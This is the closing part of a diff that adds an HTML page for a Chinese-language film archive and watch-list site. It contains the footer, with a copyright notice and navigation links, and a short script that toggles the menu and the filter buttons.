+      <div class="brand">老铁<em>电影网</em></div>
+      <p>© 2018–2026 老铁电影网（laotiedianyingwang-wap.github.io）. 本站为硬派电影资料站与片单索引，所刊片目信息、海报与剧照仅供研究参阅，版权归出品方及相关权利人所有。</p>
+      <p>本站地址：<b style="font-family:monospace;color:#111">https://laotiedianyingwang-wap.github.io/</b></p>
+    </div>
+    <div>
+      <h5>栏目导航</h5>
+      <ul>
+        <li><a href="#films">01 硬派片单</a></li>
+        <li><a href="#duel">02 经典对决</a></li>
+        <li><a href="#quotes">03 台词档案</a></li>
+        <li><a href="#sched">04 放映排期</a></li>
+        <li><a href="#about">05 资料室</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>关于本站</h5>
+      <ul>
+        <li><a href="#about">资料室说明</a></li>
+        <li><a href="#sched">投稿与勘误</a></li>
+        <li><a href="#films">片种分类</a></li>
+        <li><a href="#links">链接合作</a></li>
+      </ul>
+      <a href="#" class="topbtn">回到顶部 ↑</a>
+    </div>
+  </div>
+  <div class="wrap foot-bot">
+    <span>LAOTIE DIANYING WANG — HARD-BOILED FILM ARCHIVE</span>
+    <span>https://laotiedianyingwang-wap.github.io/</span>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),nav=document.getElementById('nav');
+ham.addEventListener('click',function(){nav.classList.toggle('show')});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('show')})});
+var btns=document.querySelectorAll('.filters button');
+btns.forEach(function(b){b.addEventListener('click',function(){
+  btns.forEach(function(x){x.classList.remove('on')});
+  b.classList.add('on');
+})});
+</script>
+</body>
+</html>
